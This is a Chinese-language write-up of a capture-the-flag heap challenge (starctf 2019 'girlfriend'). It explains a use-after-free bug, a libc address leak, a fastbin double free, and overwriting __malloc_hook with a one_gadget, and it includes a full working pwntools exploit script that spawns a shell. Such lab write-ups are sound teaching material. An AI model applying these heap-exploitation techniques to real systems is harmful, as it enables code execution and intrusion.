# 漏洞利用文档：heap23_13_starctf_2019_girlfriend

## 执行环境
- **运行环境**
    - Ubuntu 16.04
    - libc 2.23
- **缓解措施**
    - ASLR: on
    - PIE: off (从反编译代码中无PIE特征及调试信息判断)
    - NX: on
    - RELRO: Partial RELRO
    - Canary: on

## 漏洞成因
### 程序关键结构体
程序使用一个全局数组（`unk_202060`）来管理最多100个“女孩”的信息。每个信息由一个在堆上分配的结构体表示。
根据`sub_B49`（添加功能）和`sub_CFC`（显示功能）的代码分析，该结构体布局大致如下：
```c
struct girl_info {
    char *name_ptr;     // 指向存储名字的堆块
    int name_size;      // 名字堆块的大小
    char phone[12];     // 电话号码，固定12字节
    char padding;       // 填充字节，总大小为0x18字节
};
```
其中，`name_ptr`指向另一个通过`malloc(name_size)`分配的堆块。

### 漏洞定位
漏洞位于`sub_DD6`函数（`Call that girl!`选项，对应exp中的`call`函数）中。
```c
if ( *((_QWORD *)&unk_202060 + v2) )
    free(**((void ***)&unk_202060 + v2)); // 仅释放了 name_ptr 指向的堆块
```
该函数在释放`name_ptr`后，**并未将结构体指针（即全局数组中的项）置空**。这导致了`Use-After-Free (UAF)`漏洞。因为`sub_CFC`（`Show info`）函数在显示信息时，仍然会通过这个未被置空的结构体指针去访问已被释放的`name_ptr`，从而泄露堆内存内容。同时，由于结构体指针本身未被清理，也为后续的`Double Free`攻击创造了条件。

## 漏洞利用过程：
利用过程主要分为以下几个步骤：首先利用UAF泄露libc基址；然后通过精心构造的`free`操作在fastbin中制造一个循环链表，为`fastbin attack`打下基础；接着利用`fastbin attack`将`__malloc_hook`附近的区域伪造成一个`fast chunk`并分配到手；最后在该处写入`one_gadget`地址，触发`malloc_hook`以获取shell。

### Step 1 ~ 3: 泄露libc基址
- **Step 1**: `add(0x80);add(0x60);add(0x60)`
    - 分配了三个`girl_info`结构体（各0x18字节）和对应的名字堆块。
    - 第一个名字堆块大小为0x90（0x80+0x10），属于`small bin`范围。后续两个名字堆块大小为0x70（0x60+0x10），属于`fastbin`范围。
    - 这为后续操作做好了堆布局。

- **Step 2**: `call(0)`
    - 调用`free`释放了`girl[0].name_ptr`所指向的`0x90`大小的堆块。
    - 该堆块被放入`unsorted bin`。由于其是当前`unsorted bin`中唯一的块，其`fd`和`bk`指针均指向`main_arena`中的某个位置（`&main_arena.top`）。

- **Step 3**: `name, _ = show(0)`
    - 利用UAF漏洞，读取已被释放的`girl[0].name_ptr`指向的堆块内容。
    - 此时，该`0x90`大小堆块的`fd`指针位置（即用户数据起始处）存放着`main_arena`的地址。通过解析这个地址，可以计算出`libc`的基址。
    - 调试记录显示：`name`指针`0x16b6010`处的内容从`‘a’*0x80`变为`0x7f6c5b56bb78 (main_arena+88)`。

### Step 4: 构造Fastbin循环链表（Double Free）
- **Step 4**: `call(1); call(2); call(1)`
    - `call(1)`: 释放`girl[1]`的`0x70`大小名字堆块（记为`chunk A`），它进入`fastbins[5]`（管理0x70大小chunk）。
    - `call(2)`: 释放`girl[2]`的`0x70`大小名字堆块（记为`chunk B`），它也被链接到`fastbins[5]`，此时链表为 `B -> A`。
    - `call(1)`: **再次释放`chunk A`**。由于`girl[1]`的结构体指针未被清零，可以再次调用`free`。这导致`chunk A`被第二次释放，形成`Double Free`。此时，`fastbins[5]`的链表变为 `A -> B -> A`，形成了一个循环。
    - **关键点**：`free`检测`double free`是通过检查`fastbin`链表的第一个块是否与待释放块相同。由于在`call(1)`之前我们先释放了`chunk B`，使得链表头变为`B`，从而绕过了对`chunk A`的`double free`检测。

### Step 5 ~ 6: Fastbin Attack 劫持 `__malloc_hook`
- **Step 5**: `add(0x60, p64(libc.sym[“__malloc_hook”] - 0x23)); add(0x60); add(0x60)`
    - 第一次`add`：从`fastbins[5]`（链表为`A->B->A`）中分配出`chunk A`。我们在其`name`字段写入了目标地址：`__malloc_hook`附近的伪造`fast chunk`地址（`__malloc_hook - 0x23`）。这个地址经过计算，其`size`字段（位于`chunk头`）的值恰好能绕过`fastbin`的`size`检查（通常为`0x7f`）。此时，`fastbins[5]`链表变为 `B -> A`。
    - 第二次`add`：分配出`chunk B`。链表变为 `A`（但注意，这个`A`的`fd`指针在上一步已被我们覆写为目标地址）。
    - 第三次`add`：分配出被我们篡改了`fd`指针的`chunk A`。此时，`fastbins[5]`链表头变成了我们写入的伪造地址：`__malloc_hook - 0x23`。

- **Step 6**: `add(0x60, payload)`
    - 这次`add`会尝试从`fastbins[5]`分配，而链表头是我们的伪造地址。只要该地址能通过`malloc`对`fast chunk`的`size`检查（检查其`size`字段是否与当前`fastbin`索引匹配），分配就会成功。
    - 我们成功在`__malloc_hook`附近（`fake_chunk_addr = __malloc_hook - 0x23`）分配到了一个`chunk`。
    - 我们向这个`chunk`的`name`区域（即`fake_chunk_addr + 0x10`的用户数据区）写入了精心构造的`payload`：
        - `b’a’*11`: 填充，使后续数据对齐到`__malloc_hook`的地址。
        - `p64(one_gadget)`: 将`one_gadget`地址写入`__malloc_hook`。
        - `p64(libc.sym[‘realloc’]+2)`: 可选，有时用于调整栈环境以满足`one_gadget`的约束条件。这里被写入`__malloc_hook+8`的位置。

### Step 7 ~ 8: 触发漏洞执行流劫持
- **Step 7**: `p.sendlineafter(“Input your choice:”, “1”)`
    - 选择“Add a girl’s info”功能，程序会调用`malloc`分配新的`girl_info`结构体。
    - 由于`__malloc_hook`已被覆盖为`one_gadget`地址，`malloc`的执行流被劫持，跳转到`one_gadget`执行。
- **Step 8**: `p.interactive()`
    - 成功获取远程`shell`。

## Exploit：
```python
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
# 启动进程，加载ELF和libc
p = process('./data/bin/heap23_13_starctf_2019_girlfriend')
elf = ELF('./data/bin/heap23_13_starctf_2019_girlfriend')
libc = elf.libc

def add(size, name="a",phone="b"):
    p.sendlineafter("Input your choice:", "1")
    p.sendlineafter("Please input the size of girl's name\n", str(size))
    p.sendafter("please inpute her name:\n", name) # name写入 name_ptr 指向的堆块
    p.sendafter("please input her call:\n", phone) # phone写入 结构体的phone字段

def show(idx):
    p.sendlineafter("Input your choice:", "2")
    p.sendlineafter("Please input the index:\n", str(idx))
    p.recvuntil("name:\n")
    name = p.recvline() # 利用UAF，读取可能已被释放的name堆块内容
    p.recvuntil("phone:\n")
    phone = p.recvline()
    info("recv name:{}  phone:{}".format(name, phone))
    return name, phone

def call(idx):
    p.sendlineafter("Input your choice:", "4")
    p.sendlineafter("Please input the index:\n", str(idx)) # 触发漏洞：free(name_ptr)但不置空结构体指针

# Step 1: 堆布局，创建不同大小的chunk
add(0x80) # girl0, name chunk size = 0x90 (unsorted/small bin)
add(0x60) # girl1, name chunk size = 0x70 (fastbin)
add(0x60) # girl2, name chunk size = 0x70 (fastbin)

# Step 2: 释放 girl0 的 name chunk 到 unsorted bin
call(0)

# Step 3: 利用UAF泄露 libc 地址
name, _ = show(0)
# 从泄露的内容中解析出 main_arena 的地址
leak_libc_addr = u64(name[:-1].ljust(8, b"\x00"))
# 计算libc基址。偏移量根据libc版本和调试确定（main_arena+88 到 __malloc_hook 的偏移）
libc_base_addr = leak_libc_addr - (libc.sym['__malloc_hook'] + 0x10 + 0x58)
libc.address = libc_base_addr
info("libc base: " + hex(libc_base_addr))

# Step 4: 构造 fastbin 循环链表 (A -> B -> A)
call(1) # free A (girl1‘s name chunk)
call(2) # free B (girl2‘s name chunk)
call(1) # Double Free A

# Step 5: Fastbin Attack, 将 __malloc_hook 附近区域链入fastbin
# 第一次add取出A，并写入目标地址作为新的fd
add(0x60, p64(libc.sym["__malloc_hook"] - 0x23))
# 第二、三次add取出B和A，使fastbin链表头指向目标地址
add(0x60)
add(0x60)

# Step 6: 在 __malloc_hook 处分配chunk并写入one_gadget
one_gadget = libc.address + 0xf1247 # 具体的one_gadget偏移需根据libc版本调整
# 构造payload，将one_gadget写入__malloc_hook，realloc+2用于可能的栈调整
payload = b'a' * 11 + p64(one_gadget) + p64(libc.sym['realloc']+2)
add(0x60, payload) # 此add从目标地址分配chunk，并写入payload

# Step 7: 触发 __malloc_hook
p.sendlineafter("Input your choice:", "1")

# Step 8: 交互
p.interactive()
```